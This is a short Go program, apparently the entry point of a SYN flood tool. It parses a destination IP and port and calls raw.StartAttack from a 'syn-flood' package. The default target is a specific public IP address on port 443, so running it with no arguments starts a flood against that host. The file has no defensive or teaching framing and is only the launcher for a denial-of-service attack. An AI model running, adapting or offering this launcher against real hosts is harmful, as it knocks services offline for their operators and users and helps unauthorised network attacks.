package main

import (
	"github.com/bilalcaliskan/syn-flood/pkg/raw"
	flag "github.com/spf13/pflag"
)

var (
	dstIpStr string
	dstPort int
)

func init() {
	flag.StringVar(&dstIpStr, "dstIpStr", "213.238.175.187", "Provide public ip of the destination")
	flag.IntVar(&dstPort, "dstPort", 443, "Provide reachable port of the destination")
	flag.Parse()
}

func main() {
	raw.StartAttack(dstIpStr, dstPort)
}